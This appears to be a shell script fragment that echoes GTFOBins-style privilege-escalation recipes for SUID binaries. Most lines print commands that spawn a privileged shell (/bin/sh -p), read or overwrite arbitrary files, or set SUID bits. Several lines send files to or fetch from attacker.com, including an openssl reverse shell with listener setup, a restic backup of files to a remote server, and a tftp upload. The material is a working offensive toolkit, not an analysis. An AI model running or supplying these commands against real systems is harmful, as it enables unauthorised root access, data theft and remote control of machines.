echo Associated Command: "$full_binary_path" /bin/sh -p
echo Associated Command: URL=http://attacker.com/
echo LFILE=file_to_send
echo "$full_binary_path" -p \$LFILE \$URL
echo Associated Command: "$full_binary_path" -o -p -l /bin/sh -a root tty
echo LFILE=file_to_read
echo Associated Command: "$full_binary_path" -F $LFILE
echo TF=$(mktemp -u)
echo LFILE=file_to_read
echo "$full_binary_path" r $TF $LFILE
echo cat $TF
echo TF=$(mktemp -d)
echo LFILE=file_to_write
echo LDIR=where_to_write
echo echo DATA >$TF/$LFILE
echo "$full_binary_path" a $TF/a $TF/$LFILE
echo "$full_binary_path" e $TF/a $LDIR
echo LFILE=file_to_read
echo "$full_binary_path" -v -f "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" @$LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -ns "$LFILE"
echo "$full_binary_path"
echo LFILE=file_to_read
echo "$full_binary_path" -c "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
echo LFILE=file_to_read
echo "$full_binary_path" '//' "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE" | base32 --decode
echo LFILE=file_to_read
echo ./base64 "$LFILE" | base64 --decode
echo LFILE=file_to_read
echo "$full_binary_path" --base64 $LFILE | "$full_binary_path" -d --base64
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE" | "$full_binary_path" --decode
echo ./bash -p
echo LFILE=file_to_read
echo "$full_binary_path" -s $LFILE
echo quit
echo LFILE=file_to_read
echo "$full_binary_path" -b "$LFILE"
echo "$full_binary_path" sh
echo LFILE=file_to_read
echo "$full_binary_path" -c $LFILE | "$full_binary_path" -d
echo "$full_binary_path" exec -- /bin/sh -p
echo "$full_binary_path" --gid=0 --uid=0 --
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo LFILE=file_to_change
echo "$full_binary_path" 6777 $LFILE
echo "$full_binary_path" -n 0 -- /bin/sh -p
echo LFILE=file_to_change
echo "$full_binary_path" $(id -un):$(id -gn) $LFILE
echo "$full_binary_path" / /bin/sh -p
echo LFILE=file_to_read
echo TF=$(mktemp -d)
echo touch $TF/empty.yara
echo "$full_binary_path" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE /dev/zero -b -l
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE /dev/null 2>/dev/null
echo LFILE=file_to_read
echo TF=$(mktemp -d)
echo "echo \"\$LFILE\" | "$full_binary_path" -R \$UID -dp \$TF"
echo cat "$TF/$LFILE"
echo ""
echo OR
echo ""
echo Copies $LFILE to the $LDIR directory.
echo LFILE=file_to_write
echo LDIR=where_to_write
echo echo DATA >$LFILE
echo "echo \"\$LFILE\" | ./cpio -R 0:0 -p \$LDIR"
echo "$full_binary_path" -l 100 -f -- /bin/sh -p
echo "$full_binary_path" -b
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE 1
echo cat xx01
echo LFILE=file_to_read
echo "$full_binary_path" trim t $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -i application/octet-stream -m application/octet-stream $LFILE
echo Fetch a remote file via HTTP GET request.
echo URL=http://attacker.com/file_to_get
echo LFILE=file_to_save
echo "$full_binary_path" $URL -o $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -d "" -f1 "$LFILE"
echo "$full_binary_path" -p
echo LFILE=file_to_read
echo "$full_binary_path" -f $LFILE
echo LFILE=file_to_write
echo echo "data" | "$full_binary_path" of=$LFILE
echo "$full_binary_path"
echo !/bin/sh
echo LFILE=file_to_read
echo "$full_binary_path" --textbox "$LFILE" 0 0
echo LFILE=file_to_read
echo "$full_binary_path" --line-format=%L /dev/null $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -f $LFILE
echo "$full_binary_path" /bin/sh -p
echo "$full_binary_path" create base <<EOF
echo 0 3534848 linear /dev/loop0 94208
echo EOF
echo "$full_binary_path" ls --exec '/bin/sh -p -s'
echo "$full_binary_path" run -v /:/mnt --rm -it alpine chroot /mnt sh
echo Note that the name of the written file in the following example will be FILE_TO_. Also note that echo terminates the string with a DOS-style line terminator (\r\n), if thatâ€™s a problem and your scenario allows it, you can create t
echo LFILE='\path\to\file_to_write'
echo "$full_binary_path" -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
echo "$full_binary_path" file_to_read
echo ,p
echo q
echo LFILE=file_to_read
echo "$full_binary_path" -d "$LFILE"
echo "$full_binary_path"
echo "$full_binary_path" -Q -nw --eval '(term "/bin/sh -p")'
echo "$full_binary_path" /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" -qXf "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo "$full_binary_path" -c 'spawn /bin/sh -p;interact'
echo LFILE=file_to_read
echo "$full_binary_path" -f $LFILE
echo "$full_binary_path" . -exec /bin/sh -p \; -quit
echo "$full_binary_path"
echo "$full_binary_path" -u / /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" -999 "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" -w99999999 "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" '//' "$LFILE"
echo 
echo OR
echo 
echo Limited SUID
echo "$full_binary_path" 'BEGIN {system("/bin/sh")}'
echo "$full_binary_path" $PID
echo "$full_binary_path" -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
echo "$full_binary_path" -c '/bin/sh'
echo LFILE=file_to_read
echo "$full_binary_path" -sort "$LFILE"    
echo "$full_binary_path" -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
echo LFILE=file_to_read
echo "$full_binary_path" '' $LFILE
echo TF=$(mktemp)
echo echo '#!/bin/sh -p' > $TF
echo echo 'exec /bin/sh -p 0<&1' >> $TF
echo chmod +x $TF
echo sudo "$full_binary_path" -q $TF
echo LFILE=file_to_read
echo "$full_binary_path" -f $LFILE -t
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" -c1G "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" -C "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" --no-doc --failsafe "$LFILE"
echo "$full_binary_path"
echo /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" -f 8859_1 -t 8859_1 "$LFILE"
echo LFILE=file_to_change
echo TF=$(mktemp)
echo "$full_binary_path" -m 6777 $LFILE $TF
echo "$full_binary_path" /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" -force -batch "$LFILE"
echo 
echo "$full_binary_path" netns add foo
echo "$full_binary_path" netns exec foo /bin/sh -p
echo "$full_binary_path" netns delete foo
echo "$full_binary_path" /etc/passwd
echo !/bin/sh -p
echo echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | "$full_binary_path"
echo LFILE=file_to_read
echo "$full_binary_path" -a 2 /dev/null $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -Rr . "$LFILE"
echo "$full_binary_path" -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
echo "$full_binary_path" -e 'run(`/bin/sh -p`)'
echo "$full_binary_path" -p
echo LFILE=file_to_read
echo "$full_binary_path" -i $LFILE
echo LFILE=dir_to_serve
echo "$full_binary_path" proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/
echo "$full_binary_path" /bin/sh -p
echo "$full_binary_path" file_to_read
echo "$full_binary_path" /dev/null /bin/sh -i -p
echo LFILE=file_to_read
echo "$full_binary_path" '' "$LFILE"
echo "$full_binary_path" -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
echo COMMAND='/bin/sh -p'
echo "$full_binary_path" -s --eval=$'x:\n\t-'"$COMMAND"
echo LFILE=file_to_read
echo "$full_binary_path" '//' "$LFILE"
echo "$full_binary_path" file_to_read
echo LFILE=file_to_read
echo "$full_binary_path" -c "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" -P $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -P $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -P $LFILE
echo echo x | "$full_binary_path" -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
echo LFILE=file_to_read
echo "$full_binary_path" -P $LFILE /dev/null
echo LFILE=file_to_read
echo "$full_binary_path" -P $LFILE
echo "$full_binary_path" /bin/sh -p
echo LFILE=file_to_write
echo TF=$(mktemp)
echo echo "DATA" > $TF
echo "$full_binary_path" $TF $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -@ $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" '//' "$LFILE"
echo "$full_binary_path"
echo !/bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" -f "$LFILE"
echo "$full_binary_path" /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" -bn -w1 -s '' $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" @$LFILE
echo The payload appears inside the regular nmap output.
echo LFILE=file_to_write
echo "$full_binary_path" -oG=$LFILE DATA
echo "$full_binary_path" -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
echo "$full_binary_path" /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
echo LFILE=file_to_read
echo "$full_binary_path" -An -c -w9999 "$LFILE"
echo To receive the shell run the following on the attacker box:
echo 
echo "$full_binary_path" req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
echo "$full_binary_path" s_server -quiet -key key.pem -cert cert.pem -port 12345
echo Communication between attacker and target will be encrypted.
echo 
echo RHOST=attacker.com
echo RPORT=12345
echo mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | "$full_binary_path" s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
echo 
echo LFILE=file_to_write
echo echo DATA | "$full_binary_path" enc -out "$LFILE"
echo "$full_binary_path" --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
echo The file is actually parsed and the first partial wrong line is returned in an error message.
echo LFILE=file_to_read
echo "$full_binary_path" --config "$LFILE"
echo LFILE=file_to_write
echo echo DATA | "$full_binary_path" -t plain -o "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE
echo "$full_binary_path" stat /bin/sh -p
echo "$full_binary_path" -e 'exec "/bin/sh";'
echo "$full_binary_path" /bin/sh -p
echo "$full_binary_path" file_to_read
echo CMD="/bin/sh"
echo "$full_binary_path" -r "pcntl_exec('/bin/sh', ['-p']);"
echo COMMAND=id
echo "$full_binary_path" -e $COMMAND
echo LFILE=file_to_read
echo "$full_binary_path" -T $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" -w 5000 "$LFILE"
echo "$full_binary_path" -c 'import os; os.execl("/bin/sh", "sh", "-p")'
echo "$full_binary_path" -c '/bin/sh -p'
echo LFILE=file_to_read
echo "$full_binary_path" -a @$LFILE
echo RHOST=attacker.com
echo RPORT=12345
echo LFILE=file_or_dir_to_get
echo NAME=backup_name
echo "$full_binary_path" backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE | rev
echo "$full_binary_path" -H /dev/null /bin/sh -p
echo "$full_binary_path" -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
echo echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
echo "$full_binary_path"
echo "$full_binary_path" --new-session --regex '^sh$' /bin --arg='-p'
echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
echo "$full_binary_path"
echo "$full_binary_path"
echo shell /bin/sh
echo LFILE=file_to_read
echo "$full_binary_path" -e '' "$LFILE"
echo "$full_binary_path" $(arch) /bin/sh -p
echo LFILE=file_to_change
echo USER=somebody
echo "$full_binary_path" -m u:$USER:rwx $LFILE
echo "$full_binary_path" - /bin/sh -p
echo LFILE=file_to_write
echo "$full_binary_path" -e DATA -o "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo "$full_binary_path" /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" -m "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" << EOF
echo CREATE TABLE t(line TEXT);
echo .import $LFILE t
echo SELECT * FROM t;
echo EOF
echo LFILE=file_to_read
echo "$full_binary_path" -a -F $LFILE
echo "$full_binary_path" /bin/ -p
echo "$full_binary_path" -D ./lib.so
echo LFILE=file_to_read
echo "$full_binary_path" -f $LFILE
echo "$full_binary_path" /bin/sh -p
echo "$full_binary_path" -n $RANDOM -S -x /bin/sh -- -p
echo "$full_binary_path" -i0 /bin/sh -p
echo "$full_binary_path" -o /dev/null /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo COMMAND='/bin/sh -c id>/tmp/id'
echo "$full_binary_path" "kernel.core_pattern=|$COMMAND"
echo sleep 9999 &
echo kill -QUIT $!
echo cat /tmp/id
echo TF=$(mktemp).service
echo echo '[Service]
echo Type=oneshot
echo ExecStart=/bin/sh -c "id > /tmp/output"
echo [Install]
echo WantedBy=multi-user.target' > $TF
echo "$full_binary_path" link $TF
echo "$full_binary_path" enable --now $TF
echo LFILE=file_to_read
echo "$full_binary_path" -s 'RANDOM' "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" -c1G "$LFILE"
echo "$full_binary_path" 1 /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE
echo "$full_binary_path"
echo exec /bin/sh -p <@stdin >@stdout 2>@stderr
echo LFILE=file_to_write
echo echo DATA | "$full_binary_path" -a "$LFILE"
echo "$full_binary_path" console
echo file("file_to_read")
echo RHOST=attacker.com
echo "$full_binary_path" $RHOST
echo put file_to_send
echo LFILE=file_to_read
echo "$full_binary_path" -C "$LFILE"
echo "$full_binary_path" /bin/sh -p
echo "$full_binary_path" 7d /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo LFILE=file_to_read
echo "$full_binary_path" -t99999999 "$LFILE"
echo "$full_binary_path" shell
echo ./squashfs-root/sh -p
echo "$full_binary_path" -r /bin/sh
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
echo "$full_binary_path" -K shell.zip
echo ./sh -p
echo LFILE=/path/to/file_to_write
echo TF=$(mktemp)
echo echo DATA >$TF
echo "$full_binary_path" --force --install "$LFILE" x "$TF" 0
echo LFILE=file_to_read
echo uuencode "$LFILE" /dev/stdout | "$full_binary_path"
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE" /dev/stdout | uudecode
echo cd $(mktemp -d)
echo echo 'exec "/bin/sh -p"' > Vagrantfile
echo "$full_binary_path" up
echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
echo "$full_binary_path"
echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
echo "$full_binary_path" -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
echo "$full_binary_path"
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE" -dump
echo "$full_binary_path" -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'
echo LFILE=file_to_read
echo "$full_binary_path" --files0-from "$LFILE"
echo TF=$(mktemp)
echo chmod +x $TF
echo echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
echo "$full_binary_path" --use-askpass=$TF 0
echo LFILE=file_to_read
echo "$full_binary_path" --textbox --scrolltext "$LFILE" 0 0
echo "$full_binary_path" -a /dev/null sh -p
echo "$full_binary_path" exec --sync /bin/sh -p
echo LFILE=file_to_read
echo "$full_binary_path" -v $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" $LFILE
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE" | xxd -r
echo LFILE=file_to_read
echo "$full_binary_path" -c "$LFILE" | xz -d
echo "$full_binary_path"
echo "$full_binary_path"
echo LFILE=file_to_read
echo "$full_binary_path" "$LFILE"
